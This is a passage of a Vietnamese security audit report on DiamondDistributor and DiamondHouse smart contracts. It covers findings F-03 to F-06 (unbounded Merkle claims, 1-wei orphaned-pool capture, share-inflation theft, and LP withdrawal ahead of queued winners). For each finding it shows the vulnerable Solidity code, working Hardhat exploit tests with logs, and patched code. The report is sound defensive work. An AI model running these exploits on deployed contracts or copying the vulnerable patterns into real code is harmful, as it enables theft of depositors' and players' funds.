### 4.3 F-03 — Distributor không ràng buộc claim theo budget đã ký

**Mức độ:** Critical nếu root poster bị lộ; High nếu là rủi ro nội bộ. **Loại:** mint vượt budget.

#### Mô tả và nguyên nhân gốc

`postEpoch` kiểm `totalMint <= budget` (budget được tính từ anchor và giá, có chữ ký của budgeter). Nhưng `claim()` **không so sánh** với `totalMint` của epoch. Nó chỉ kiểm Merkle proof và tổng CAP toàn cục. Ai đăng Merkle root (owner) có thể gán số lượng tuỳ ý cho bất kỳ địa chỉ nào, miễn là tổng toàn cục không vượt CAP (1e9 DIAMOND).

Nghĩa là "budget" chỉ là con số trang trí: nó được kiểm một lần khi đăng header, nhưng không được dùng để giới hạn các lần claim.

#### Kịch bản khai thác

1. Owner (hoặc ai lấy được khoá root) đăng epoch với `totalMint` hợp lệ đúng bằng budget, ví dụ 20,000 DIAMOND.
2. Owner tạo Merkle tree có lá cho kẻ tấn công với 1,000,000 DIAMOND.
3. Kẻ tấn công gọi `claim` với proof hợp lệ và nhận 1,000,000 DIAMOND.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondDistributor.sol` · dòng 104–124*

```solidity
    function postEpoch(
        uint256 epochId,
        bytes32 root,
        uint256 totalMint,
        uint256 anchorUsd,
        uint256 priceX1e8,
        bytes calldata budgetSig
    ) external onlyOwner {
        require(epochId == lastEpoch + 1, "epoch order");
        require(epochs[epochId].root == bytes32(0), "posted");
        bytes32 h = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32",
                        keccak256(abi.encode(epochId, anchorUsd, priceX1e8))));
        require(_rec(h, budgetSig) == budgetAttester, "bad budget sig");
        uint256 budget = budgetFor(anchorUsd, priceX1e8);   // uses projected (adaptive) rate
        require(totalMint <= budget, "over budget");        // rate×anchor AND absolute cap
        // adapt AFTER the epoch's budget was computed at the projected rate:
        rateBps = projectedRateBps(anchorUsd);
        prevAnchorUsd = anchorUsd;
        epochs[epochId] = Epoch(root, totalMint, uint64(block.timestamp));
        lastEpoch = epochId;
        emit EpochPosted(epochId, root, totalMint, rateBps, anchorUsd, priceX1e8, budget);
```


*`audit/vulnerable/contracts/DiamondDistributor.sol` · dòng 127–138*

```solidity
    function claim(uint256 epochId, uint256 amount, bytes32[] calldata proof) external {
        Epoch storage e = epochs[epochId];
        require(e.root != bytes32(0), "no epoch");
        require(block.timestamp <= e.postedAt + MAX_EPOCH_GAP, "claim window closed");
        require(!claimed[epochId][msg.sender], "claimed");
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(epochId, msg.sender, amount))));
        require(_verify(leaf, e.root, proof), "bad proof");
        claimed[epochId][msg.sender] = true;
        totalMinted += amount;
        diamond.mint(msg.sender, amount);
        emit Claimed(epochId, msg.sender, amount);
    }
```


#### PoC

*`audit/test/F03-distributor-unbounded-claims.test.js` · dòng 19–57*

```javascript
  it("owner posts totalMint=20,000 DIAMOND (within budget) but the root pays attacker 1,000,000", async () => {
    const W = await makeWorld({ withOptions: false });
    const { owner, p3: attacker, p4: honest } = W.signers;
    const dist = W.dist, dA = await dist.getAddress();
    await (await W.diamond.setMinter(dA)).wait();
    await (await dist.setBudgetAttester(W.keys.budgeter.address)).wait();

    const epochId = 1;
    const anchorUsd = U(100);           // $100 realized fee+edge
    const price = 1_000_000n;           // $0.01 per DIAMOND (×1e8)
    const honestAmt = E18(10_000), attackerAmt = E18(1_000_000);
    const leafA = leafOf(epochId, attacker.address, attackerAmt);
    const leafH = leafOf(epochId, honest.address, honestAmt);
    const root = pairHash(leafA, leafH);
    // fixed set (D2): the budget hash is bound to chainid + distributor; the contract exposes it
    const sigDigest = isFixed()
      ? await dist.budgetHash(epochId, anchorUsd, price)
      : ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256", "uint256", "uint256"], [epochId, anchorUsd, price]));
    const budgetSig = await W.keys.budgeter.signMessage(ethers.getBytes(sigDigest));
    const budget = await dist.budgetFor(anchorUsd, price);
    console.log(`  [EVIDENCE] signed anchor=$100, price=$0.01 → on-chain budget = ${ethers.formatUnits(budget, 18)} DIAMOND`);

    // honest-looking header: totalMint = the budget (passes "over budget" check)
    await (await dist.postEpoch(epochId, root, budget, anchorUsd, price, budgetSig)).wait();
    console.log(`  [EVIDENCE] postEpoch(totalMint=${ethers.formatUnits(budget, 18)} DIAMOND) accepted`);

    const rc = await revertOf(dist.connect(attacker).claim(epochId, attackerAmt, [leafH]));
    const bal = await W.diamond.balanceOf(attacker.address);
    console.log(`  [EVIDENCE] attacker claim(1,000,000 DIAMOND) → ${rc ?? "OK"}; attacker balance = ${ethers.formatUnits(bal, 18)} DIAMOND`);
    console.log(`  [EVIDENCE] dist.totalMinted = ${ethers.formatUnits(await dist.totalMinted(), 18)} DIAMOND vs epoch budget ${ethers.formatUnits(budget, 18)}`);

    if (!isFixed()) {
      expect(rc).to.equal(null);
      expect(bal).to.equal(attackerAmt);
    } else {
      expect(rc).to.equal("epoch budget exhausted");   // F-03: per-epoch claimed ≤ posted totalMint
      expect(bal).to.equal(0n);
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F03-distributor-unbounded-claims.txt`*

```text
  [EVIDENCE] signed anchor=$100, price=$0.01 → on-chain budget = 20000.0 DIAMOND
  [EVIDENCE] postEpoch(totalMint=20000.0 DIAMOND) accepted
  [EVIDENCE] attacker claim(1,000,000 DIAMOND) → OK; attacker balance = 1000000.0 DIAMOND
  [EVIDENCE] dist.totalMinted = 1000000.0 DIAMOND vs epoch budget 20000.0
    ✔ owner posts totalMint=20,000 DIAMOND (within budget) but the root pays attacker 1,000,000 (850ms)
```


#### Đề xuất sửa

Đếm lũy kế claim theo epoch và chặn khi vượt `totalMint` đã đăng. Mỗi địa chỉ chỉ claim một lần cho mỗi epoch (đã có sẵn). Ngoài ra, ràng buộc chữ ký budget với `chainid` và địa chỉ contract (D2), để chữ ký của chuỗi/contract này không dùng được cho chuỗi/contract khác.

#### Mã sau sửa

*`contracts/DiamondDistributor.sol` · dòng 119–122*

```solidity
        bytes calldata budgetSig
    ) external onlyOwner {
        require(budgetAttester != address(0), "no budget attester");   // F-12b
        require(epochId == lastEpoch + 1, "epoch order");
```


*`contracts/DiamondDistributor.sol` · dòng 137–147*

```solidity
    function claim(uint256 epochId, uint256 amount, bytes32[] calldata proof) external {
        Epoch storage e = epochs[epochId];
        require(e.root != bytes32(0), "no epoch");
        require(block.timestamp <= e.postedAt + MAX_EPOCH_GAP, "claim window closed");
        require(!claimed[epochId][msg.sender], "claimed");
        bytes32 leaf = keccak256(bytes.concat(keccak256(abi.encode(epochId, msg.sender, amount))));
        require(_verify(leaf, e.root, proof), "bad proof");
        require(epochClaimed[epochId] + amount <= e.totalMint, "epoch budget exhausted");  // F-03
        epochClaimed[epochId] += amount;
        claimed[epochId][msg.sender] = true;
        totalMinted += amount;
```


*`contracts/DiamondDistributor.sol` · dòng 176–180*

```solidity

    /// Inner budget hash; the signed message is its EIP-191 wrap (engine mirror: signRevenueAnchor).
    function budgetHash(uint256 epochId, uint256 anchorUsd, uint256 priceX1e8) public view returns (bytes32) {
        return keccak256(abi.encode(block.chainid, address(this), epochId, anchorUsd, priceX1e8));
    }
```


#### PoC sau sửa

*`audit/test/F03-distributor-unbounded-claims.test.js` · dòng 19–57*

```javascript
  it("owner posts totalMint=20,000 DIAMOND (within budget) but the root pays attacker 1,000,000", async () => {
    const W = await makeWorld({ withOptions: false });
    const { owner, p3: attacker, p4: honest } = W.signers;
    const dist = W.dist, dA = await dist.getAddress();
    await (await W.diamond.setMinter(dA)).wait();
    await (await dist.setBudgetAttester(W.keys.budgeter.address)).wait();

    const epochId = 1;
    const anchorUsd = U(100);           // $100 realized fee+edge
    const price = 1_000_000n;           // $0.01 per DIAMOND (×1e8)
    const honestAmt = E18(10_000), attackerAmt = E18(1_000_000);
    const leafA = leafOf(epochId, attacker.address, attackerAmt);
    const leafH = leafOf(epochId, honest.address, honestAmt);
    const root = pairHash(leafA, leafH);
    // fixed set (D2): the budget hash is bound to chainid + distributor; the contract exposes it
    const sigDigest = isFixed()
      ? await dist.budgetHash(epochId, anchorUsd, price)
      : ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(["uint256", "uint256", "uint256"], [epochId, anchorUsd, price]));
    const budgetSig = await W.keys.budgeter.signMessage(ethers.getBytes(sigDigest));
    const budget = await dist.budgetFor(anchorUsd, price);
    console.log(`  [EVIDENCE] signed anchor=$100, price=$0.01 → on-chain budget = ${ethers.formatUnits(budget, 18)} DIAMOND`);

    // honest-looking header: totalMint = the budget (passes "over budget" check)
    await (await dist.postEpoch(epochId, root, budget, anchorUsd, price, budgetSig)).wait();
    console.log(`  [EVIDENCE] postEpoch(totalMint=${ethers.formatUnits(budget, 18)} DIAMOND) accepted`);

    const rc = await revertOf(dist.connect(attacker).claim(epochId, attackerAmt, [leafH]));
    const bal = await W.diamond.balanceOf(attacker.address);
    console.log(`  [EVIDENCE] attacker claim(1,000,000 DIAMOND) → ${rc ?? "OK"}; attacker balance = ${ethers.formatUnits(bal, 18)} DIAMOND`);
    console.log(`  [EVIDENCE] dist.totalMinted = ${ethers.formatUnits(await dist.totalMinted(), 18)} DIAMOND vs epoch budget ${ethers.formatUnits(budget, 18)}`);

    if (!isFixed()) {
      expect(rc).to.equal(null);
      expect(bal).to.equal(attackerAmt);
    } else {
      expect(rc).to.equal("epoch budget exhausted");   // F-03: per-epoch claimed ≤ posted totalMint
      expect(bal).to.equal(0n);
    }
  });
```


Ghi chú: trên nhánh fixed, test dùng `budgetHash` do contract cung cấp (vì digest đã đổi). Trên nhánh vulnerable, test dùng digest cũ.

*`fixed-F03-distributor-unbounded-claims.txt`*

```text
  [EVIDENCE] signed anchor=$100, price=$0.01 → on-chain budget = 10000.0 DIAMOND
  [EVIDENCE] postEpoch(totalMint=10000.0 DIAMOND) accepted
  [EVIDENCE] attacker claim(1,000,000 DIAMOND) → epoch budget exhausted; attacker balance = 0.0 DIAMOND
  [EVIDENCE] dist.totalMinted = 0.0 DIAMOND vs epoch budget 10000.0
    ✔ owner posts totalMint=20,000 DIAMOND (within budget) but the root pays attacker 1,000,000 (852ms)
```


#### Đánh giá sau sửa

- Mint vượt budget đã bị chặn: `epoch budget exhausted`.
- Budget sau sửa là 10,000 DIAMOND (vì trần tỷ lệ giảm từ 200% xuống 100%, xem F-14).
- Rủi ro còn lại: owner vẫn có thể đăng root và tự claim tới budget. Cần quy trình ký budget độc lập (mục 6).

---

### 4.4 F-04 — Chiếm pool mồ côi bằng 1 wei

**Mức độ:** High. **Loại:** ăn cắp của người chơi thua.

#### Mô tả và nguyên nhân gốc

Khi `totalShares == 0` nhưng `pool > 0`, pool có tiền (do người chơi thua đưa vào) nhưng không có LP nào giữ share. Nhánh `if (totalShares == 0 || pool == 0) shares = amount;` cho người nạp đúng `amount` share, bất kể pool đang có bao nhiêu tiền. Nạp 1 wei được 1 share = 100% pool.

#### Kịch bản khai thác

1. Pool có 1000 USDC từ người chơi thua, `totalShares = 0`.
2. Kẻ tấn công nạp 1 wei → nhận 1 share (100% pool).
3. Sau khoá 7 ngày, hắn rút: nhận toàn bộ 1000 USDC.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 333–344*

```solidity
    function lpDeposit(uint256 amount) external nonReentrant returns (uint256 shares) {
        require(amount > 0, "zero");
        if (totalShares == 0 || pool == 0) shares = amount;
        else shares = amount * totalShares / pool;
        require(shares > 0, "dust");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        pool += amount;
        totalShares += shares;
        lpShares[msg.sender] += shares;
        emit LpDeposit(msg.sender, amount, shares);
        require(lanesIntact(), "lane drift");
    }
```


#### PoC

*`audit/test/F04-F05-lp-vault-theft.test.js` · dòng 15–34*

```javascript
  it("1-wei LP deposit into an orphaned pool withdraws the whole pool after the 7-day lock", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p5 } = W.signers;
    // no LP exists; players lose 1,000 USDC → pool grows with zero shares outstanding
    const id = await buyTicket(W, p1, 1000, 2);
    await (await settleHouse(W, id, 2)).wait();                  // KNOCKED
    console.log(`  [EVIDENCE] pool after loss = ${await W.house.pool()} (6dp), totalShares = ${await W.house.totalShares()}`);

    const dep = await revertOf(W.house.connect(p5).lpDeposit(1n));  // 1 wei
    console.log(`  [EVIDENCE] attacker lpDeposit(1 wei) → ${dep ?? "OK"}; shares = ${await W.house.lpShares(p5.address)}`);
    if (dep) { expect(isFixed()).to.equal(true); return; }          // fixed: dust rejected, done
    const sh = await W.house.lpShares(p5.address);
    await (await W.house.connect(p5).lpRequestExit(sh)).wait();
    await timeTravel(7 * 86400 + 60);
    const b0 = await W.usdc.balanceOf(p5.address);
    await (await W.house.connect(p5).lpWithdraw()).wait();
    const got = (await W.usdc.balanceOf(p5.address)) - b0;
    console.log(`  [EVIDENCE] attacker paid 1 wei + gas, withdrew ${got} (6dp) = ${Number(got) / 1e6} USDC of player losses`);
    expect(got).gte(U(1000));
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F04-F05-lp-vault-theft.txt`*

```text
  [EVIDENCE] pool after loss = 1000000000 (6dp), totalShares = 0
  [EVIDENCE] attacker lpDeposit(1 wei) → OK; shares = 1
  [EVIDENCE] attacker paid 1 wei + gas, withdrew 1000000001 (6dp) = 1000.000001 USDC of player losses
    ✔ 1-wei LP deposit into an orphaned pool withdraws the whole pool after the 7-day lock (846ms)
```


#### Đề xuất sửa

Dùng **virtual shares và virtual assets** (kiểu ERC-4626 chống inflation): `shares = amount × (totalShares + VIRTUAL_SHARES) / (navPool + VIRTUAL_ASSETS)`, và yêu cầu `shares > 0`. Với `VIRTUAL_SHARES = 1e6`, 1 wei không đủ để nhận share có giá trị đáng kể. Phần share ảo không rút được nên phần dust nằm lại trong pool.

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 396–410*

```solidity
    // ---------------- LP vault (optional; pool-backed, first-loss) ----------------
    // F-04/F-05: virtual shares & assets (ERC-4626 inflation defence). The offset makes a 1-wei
    // deposit into an orphaned pool worth ~0 shares and makes donation-based share inflation
    // unprofitable. Virtual shares are never redeemable, so the dust stays in the pool.
    uint256 public constant VIRTUAL_SHARES = 1e6;
    uint256 public constant VIRTUAL_ASSETS = 1;

    function lpDeposit(uint256 amount) external nonReentrant returns (uint256 shares) {
        require(amount > 0, "zero");
        shares = amount * (totalShares + VIRTUAL_SHARES) / (navPool() + VIRTUAL_ASSETS);
        require(shares > 0, "dust");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        pool += amount;
        totalShares += shares;
        lpShares[msg.sender] += shares;
```


#### PoC sau sửa

*`audit/test/F04-F05-lp-vault-theft.test.js` · dòng 15–34*

```javascript
  it("1-wei LP deposit into an orphaned pool withdraws the whole pool after the 7-day lock", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p5 } = W.signers;
    // no LP exists; players lose 1,000 USDC → pool grows with zero shares outstanding
    const id = await buyTicket(W, p1, 1000, 2);
    await (await settleHouse(W, id, 2)).wait();                  // KNOCKED
    console.log(`  [EVIDENCE] pool after loss = ${await W.house.pool()} (6dp), totalShares = ${await W.house.totalShares()}`);

    const dep = await revertOf(W.house.connect(p5).lpDeposit(1n));  // 1 wei
    console.log(`  [EVIDENCE] attacker lpDeposit(1 wei) → ${dep ?? "OK"}; shares = ${await W.house.lpShares(p5.address)}`);
    if (dep) { expect(isFixed()).to.equal(true); return; }          // fixed: dust rejected, done
    const sh = await W.house.lpShares(p5.address);
    await (await W.house.connect(p5).lpRequestExit(sh)).wait();
    await timeTravel(7 * 86400 + 60);
    const b0 = await W.usdc.balanceOf(p5.address);
    await (await W.house.connect(p5).lpWithdraw()).wait();
    const got = (await W.usdc.balanceOf(p5.address)) - b0;
    console.log(`  [EVIDENCE] attacker paid 1 wei + gas, withdrew ${got} (6dp) = ${Number(got) / 1e6} USDC of player losses`);
    expect(got).gte(U(1000));
  });
```


*`fixed-F04-F05-lp-vault-theft.txt`*

```text
  [EVIDENCE] pool after loss = 1000000000 (6dp), totalShares = 0
  [EVIDENCE] attacker lpDeposit(1 wei) → dust; shares = 0
    ✔ 1-wei LP deposit into an orphaned pool withdraws the whole pool after the 7-day lock (876ms)
```


#### Đánh giá sau sửa

- 1 wei không tạo share (`dust`). Kẻ tấn công không lấy được gì.
- Virtual shares có chi phí: khoảng 1e-6 phần pool bị giữ lại vĩnh viễn như dust. Đây là đánh đổi chấp nhận được và đã ghi trong mã.

---

### 4.5 F-05 — Share inflation qua donation

**Mức độ:** High. **Loại:** ăn cắp của người nạp sau.

#### Mô tả và nguyên nhân gốc

Công thức `shares = amount × totalShares / pool` làm tròn xuống. Kẻ tấn công giữ một ít share, đưa tiền vào pool (ở đây bằng cách thua cược 2000 USDC, phần đó tăng NAV), rồi chờ nạp của victim. Với NAV lớn so với số share, victim nhận rất ít share, phần giá trị của họ bị chia cho kẻ tấn công.

#### Kịch bản khai thác

1. Kẻ tấn công nạp 1 wei, nhận 1 share.
2. Kẻ tấn công cược thua 2000 USDC: pool tăng lên 4999 USDC, vẫn chỉ có 1 share.
3. Victim nạp 2999 USDC: `2999 × 1 / 4999` làm tròn xuống, victim nhận ~1 share.
4. Kẻ tấn công rút: nhận gần như toàn bộ pool, bao gồm cả 2999 USDC của victim.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 333–344*

```solidity
    function lpDeposit(uint256 amount) external nonReentrant returns (uint256 shares) {
        require(amount > 0, "zero");
        if (totalShares == 0 || pool == 0) shares = amount;
        else shares = amount * totalShares / pool;
        require(shares > 0, "dust");
        require(usdc.transferFrom(msg.sender, address(this), amount), "pay in");
        pool += amount;
        totalShares += shares;
        lpShares[msg.sender] += shares;
        emit LpDeposit(msg.sender, amount, shares);
        require(lanesIntact(), "lane drift");
    }
```


Và NAV slice khi rút (làm tăng tác động vì `pool` không trừ queue):

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 354–366*

```solidity
    function lpWithdraw() external nonReentrant {
        uint256 sh = lpPendingExit[msg.sender];
        require(sh > 0, "nothing");
        require(block.timestamp >= lpExitAvailableAt[msg.sender], "locked");
        lpPendingExit[msg.sender] = 0;
        totalShares -= sh;
        uint256 amount = pool == 0 ? 0 : sh * pool / (totalShares + sh); // NAV slice
        if (amount > pool) amount = pool;
        pool -= amount;
        require(usdc.transfer(msg.sender, amount), "lp out");
        emit LpWithdrawn(msg.sender, amount);
        require(lanesIntact(), "lane drift");
    }
```


#### PoC

*`audit/test/F04-F05-lp-vault-theft.test.js` · dòng 40–84*

```javascript
  it("attacker (1 share) inflates NAV with losing bets; victim's deposit rounds to 1 share", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p2, p4, p5: attacker, lp } = W.signers;
    const victim = p4;
    // Attacker deposits the minimum: 1 wei → 1 share (first depositor)
    const d0 = await revertOf(W.house.connect(attacker).lpDeposit(1n));
    expect(d0).to.equal(null);
    // Attacker donates ~2,000 USDC of NAV via bets that they LOSE (KNOCKED → pool)
    const donated = U(2000);
    const id = await buyTicket(W, attacker, 2000, 2);
    await (await settleHouse(W, id, 2)).wait();
    // Victim deposits 2,999 USDC: shares = 2999e6 * 1 / 2000e6 = 1 (floor). Expect honest 1:1 accounting.
    const vDep = U(2999);
    const v = await revertOf(W.house.connect(victim).lpDeposit(vDep));
    const sVictim = await W.house.lpShares(victim.address);
    const sAtt = await W.house.lpShares(attacker.address);
    console.log(`  [EVIDENCE] pool after attacker's losing bets = ${await W.house.pool()} (6dp)`);
    console.log(`  [EVIDENCE] victim deposit 2,999 USDC → ${v ?? "OK"}; victim shares=${sVictim}, attacker shares=${sAtt}`);

    // Both exit; compare NAV payouts
    await (await W.house.connect(attacker).lpRequestExit(sAtt)).wait();
    if (v === null) await (await W.house.connect(victim).lpRequestExit(sVictim)).wait();
    await timeTravel(7 * 86400 + 60);
    const ba = await W.usdc.balanceOf(attacker.address);
    await (await W.house.connect(attacker).lpWithdraw()).wait();
    const attGot = (await W.usdc.balanceOf(attacker.address)) - ba;
    let vicGot = 0n;
    if (v === null) {
      const bv = await W.usdc.balanceOf(victim.address);
      await (await W.house.connect(victim).lpWithdraw()).wait();
      vicGot = (await W.usdc.balanceOf(victim.address)) - bv;
    }
    const attCost = donated + 1n;
    console.log(`  [EVIDENCE] attacker cost = 2000 USDC (lost bets) + 1 wei, received = ${Number(attGot) / 1e6} USDC → net ${(Number(attGot) - Number(attCost)) / 1e6} USDC`);
    if (v === null) console.log(`  [EVIDENCE] victim deposited 2999 USDC, received ${Number(vicGot) / 1e6} USDC → net ${(Number(vicGot) - Number(vDep)) / 1e6} USDC`);

    if (!isFixed()) {
      expect(v).to.equal(null);
      expect(attGot).gt(attCost);                 // attacker profits from victim
      expect(vicGot).lt(vDep);                    // victim loses money
    } else {
      expect(attGot).lt(attCost);                 // inflation attack unprofitable
      expect(vicGot).gte(vDep - U(1));            // victim keeps (≈) its deposit
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F04-F05-lp-vault-theft.txt`*

```text
  [EVIDENCE] pool after attacker's losing bets = 4999000001 (6dp)
  [EVIDENCE] victim deposit 2,999 USDC → OK; victim shares=1, attacker shares=1
  [EVIDENCE] attacker cost = 2000 USDC (lost bets) + 1 wei, received = 2499.5 USDC → net 499.499999 USDC
  [EVIDENCE] victim deposited 2999 USDC, received 2499.500001 USDC → net -499.499999 USDC
    ✔ attacker (1 share) inflates NAV with losing bets; victim's deposit rounds to 1 share (124ms)
```


#### Đề xuất sửa

Cùng bản vá với F-04 (virtual shares), và tính NAV slice trước khi đốt share (F-06).

#### Mã sau sửa

*`contracts/DiamondHouse.sol` · dòng 423–436*

```solidity
    function lpWithdraw() external nonReentrant {
        uint256 sh = lpPendingExit[msg.sender];
        require(sh > 0, "nothing");
        require(block.timestamp >= lpExitAvailableAt[msg.sender], "locked");
        lpPendingExit[msg.sender] = 0;
        // NAV slice computed BEFORE burning (F-06: senior queue debt is excluded)
        uint256 amount = sh * (navPool() + VIRTUAL_ASSETS) / (totalShares + VIRTUAL_SHARES);
        if (amount > navPool()) amount = navPool();
        // never burn shares for nothing: while queued winners owe more than the pool, NAV is 0
        // and the exit must wait (reverts → shares and the exit request are kept).
        require(amount > 0, "nav empty");
        totalShares -= sh;
        pool -= amount;
        _send(msg.sender, amount);
```


#### PoC sau sửa

*`audit/test/F04-F05-lp-vault-theft.test.js` · dòng 40–84*

```javascript
  it("attacker (1 share) inflates NAV with losing bets; victim's deposit rounds to 1 share", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { p1, p2, p4, p5: attacker, lp } = W.signers;
    const victim = p4;
    // Attacker deposits the minimum: 1 wei → 1 share (first depositor)
    const d0 = await revertOf(W.house.connect(attacker).lpDeposit(1n));
    expect(d0).to.equal(null);
    // Attacker donates ~2,000 USDC of NAV via bets that they LOSE (KNOCKED → pool)
    const donated = U(2000);
    const id = await buyTicket(W, attacker, 2000, 2);
    await (await settleHouse(W, id, 2)).wait();
    // Victim deposits 2,999 USDC: shares = 2999e6 * 1 / 2000e6 = 1 (floor). Expect honest 1:1 accounting.
    const vDep = U(2999);
    const v = await revertOf(W.house.connect(victim).lpDeposit(vDep));
    const sVictim = await W.house.lpShares(victim.address);
    const sAtt = await W.house.lpShares(attacker.address);
    console.log(`  [EVIDENCE] pool after attacker's losing bets = ${await W.house.pool()} (6dp)`);
    console.log(`  [EVIDENCE] victim deposit 2,999 USDC → ${v ?? "OK"}; victim shares=${sVictim}, attacker shares=${sAtt}`);

    // Both exit; compare NAV payouts
    await (await W.house.connect(attacker).lpRequestExit(sAtt)).wait();
    if (v === null) await (await W.house.connect(victim).lpRequestExit(sVictim)).wait();
    await timeTravel(7 * 86400 + 60);
    const ba = await W.usdc.balanceOf(attacker.address);
    await (await W.house.connect(attacker).lpWithdraw()).wait();
    const attGot = (await W.usdc.balanceOf(attacker.address)) - ba;
    let vicGot = 0n;
    if (v === null) {
      const bv = await W.usdc.balanceOf(victim.address);
      await (await W.house.connect(victim).lpWithdraw()).wait();
      vicGot = (await W.usdc.balanceOf(victim.address)) - bv;
    }
    const attCost = donated + 1n;
    console.log(`  [EVIDENCE] attacker cost = 2000 USDC (lost bets) + 1 wei, received = ${Number(attGot) / 1e6} USDC → net ${(Number(attGot) - Number(attCost)) / 1e6} USDC`);
    if (v === null) console.log(`  [EVIDENCE] victim deposited 2999 USDC, received ${Number(vicGot) / 1e6} USDC → net ${(Number(vicGot) - Number(vDep)) / 1e6} USDC`);

    if (!isFixed()) {
      expect(v).to.equal(null);
      expect(attGot).gt(attCost);                 // attacker profits from victim
      expect(vicGot).lt(vDep);                    // victim loses money
    } else {
      expect(attGot).lt(attCost);                 // inflation attack unprofitable
      expect(vicGot).gte(vDep - U(1));            // victim keeps (≈) its deposit
    }
  });
```


*`fixed-F04-F05-lp-vault-theft.txt`*

```text
  [EVIDENCE] pool after attacker's losing bets = 4999000001 (6dp)
  [EVIDENCE] victim deposit 2,999 USDC → OK; victim shares=2998999, attacker shares=1000000
  [EVIDENCE] attacker cost = 2000 USDC (lost bets) + 1 wei, received = 1000.0002 USDC → net -999.999801 USDC
  [EVIDENCE] victim deposited 2999 USDC, received 2998.999601 USDC → net -0.000399 USDC
    ✔ attacker (1 share) inflates NAV with losing bets; victim's deposit rounds to 1 share (126ms)
```


#### Đánh giá sau sửa

- Kẻ tấn công lỗ gần 1000 USDC (không lời). Victim mất 0.000399 USDC, do làm tròn. Tấn công không còn sinh lời.
- Nhận xét: trong PoC, kẻ tấn công lỗ vì phải chịu thua cược 2000 USDC để tăng NAV. Tôi **chưa kiểm chứng** liệu có cách nào tăng NAV mà không chịu lỗ tương đương (ví dụ qua phí do chính họ kiểm soát). Nếu có, tấn công sẽ vẫn tồn tại ở mức nhẹ hơn; đây là điểm cần kiểm thêm, không phải kết luận.

---

### 4.6 F-06 — `lpWithdraw` bỏ qua `queueDebt`

**Mức độ:** High. **Loại:** ăn cắp của người thắng đang chờ.

#### Mô tả và nguyên nhân gốc

`queueDebt` là khoản nợ **ưu tiên** (senior): tiền thắng cược đang chờ trong hàng đợi. Nó phải được trả trước khi LP được rút. Nhưng `lpWithdraw` tính NAV slice từ `pool` mà không trừ `queueDebt`. Khi pool có tiền nhưng nợ hàng đợi lớn hơn, LP rút phần lẽ ra thuộc về người thắng.

#### Kịch bản khai thác

1. Hàng đợi có nợ 480.05 USDC (5 vé thắng khi pool rỗng).
2. LP nạp 100 USDC vào pool → pool = 100 USDC.
3. LP yêu cầu rút và sau khoá, gọi `lpWithdraw`: nhận 100 USDC, pool về 0.
4. Người thắng vẫn nợ 480.05 USDC nhưng pool không còn tiền để trả.

#### Mã lỗi (mã gốc)

*`audit/vulnerable/contracts/DiamondHouse.sol` · dòng 354–366*

```solidity
    function lpWithdraw() external nonReentrant {
        uint256 sh = lpPendingExit[msg.sender];
        require(sh > 0, "nothing");
        require(block.timestamp >= lpExitAvailableAt[msg.sender], "locked");
        lpPendingExit[msg.sender] = 0;
        totalShares -= sh;
        uint256 amount = pool == 0 ? 0 : sh * pool / (totalShares + sh); // NAV slice
        if (amount > pool) amount = pool;
        pool -= amount;
        require(usdc.transfer(msg.sender, amount), "lp out");
        emit LpWithdrawn(msg.sender, amount);
        require(lanesIntact(), "lane drift");
    }
```


#### PoC

*`audit/test/F06-F08-admin-and-queue.test.js` · dòng 17–45*

```javascript
  it("LP withdraws its 100 USDC while winners' profit is still owed", async () => {
    const W = await makeWorld({ withOptions: false, classCap: U(50_000) });
    const { lp, p1, p2 } = W.signers;
    // pool is empty: five winning 100-stake 2x tickets are fully queued (no LP yet)
    for (let i = 0; i < 5; i++) {
      const id = await buyTicket(W, i % 2 ? p1 : p2, 100, 2);
      await (await settleHouse(W, id, 1)).wait();
    }
    console.log(`  [EVIDENCE] queueDebt after 5 wins with empty pool = ${await W.house.queueDebt()} (6dp), pool = ${await W.house.pool()}`);
    await (await W.house.connect(lp).lpDeposit(U(100))).wait();   // LP enters the indebted pool
    console.log(`  [EVIDENCE] after LP deposit 100: pool=${await W.house.pool()}, queueDebt=${await W.house.queueDebt()}`);
    await (await W.house.connect(lp).lpRequestExit(await W.house.lpShares(lp.address))).wait();
    await timeTravel(7 * 86400 + 60);
    const b0 = await W.usdc.balanceOf(lp.address);
    const rW = await revertOf(W.house.connect(lp).lpWithdraw());
    const got = (await W.usdc.balanceOf(lp.address)) - b0;
    console.log(`  [EVIDENCE] lpWithdraw → ${rW ?? "OK"}, LP received ${Number(got) / 1e6} USDC`);
    console.log(`  [EVIDENCE] remaining queueDebt owed to winners = ${await W.house.queueDebt()} (6dp), pool = ${await W.house.pool()}`);
    if (!isFixed()) {
      expect(got).gte(U(100));                    // LP takes its full 100 USDC...
      expect(await W.house.queueDebt()).gt(0n);   // ...while winners remain unpaid
    } else {
      // F-06 fix: queued winners are senior. NAV = pool − queueDebt = 0, so the exit is refused
      // and the shares are NOT burned; the 100 USDC stays in the pool for the winners.
      expect(rW).to.equal("nav empty");
      expect(got).equal(0n);
      expect(await W.house.pool()).equal(U(100));
    }
  });
```


#### Log PoC trên mã gốc

*`vulnerable-F06-F08-admin-and-queue.txt`*

```text
  [EVIDENCE] queueDebt after 5 wins with empty pool = 480050000 (6dp), pool = 0
  [EVIDENCE] after LP deposit 100: pool=100000000, queueDebt=480050000
  [EVIDENCE] lpWithdraw → OK, LP received 100 USDC
  [EVIDENCE] remaining queueDebt owed to winners = 480050000 (6dp), pool = 0
    ✔ LP withdraws its 100 USDC while winners' profit is still owed (879ms)
```


#### Đề xuất sửa

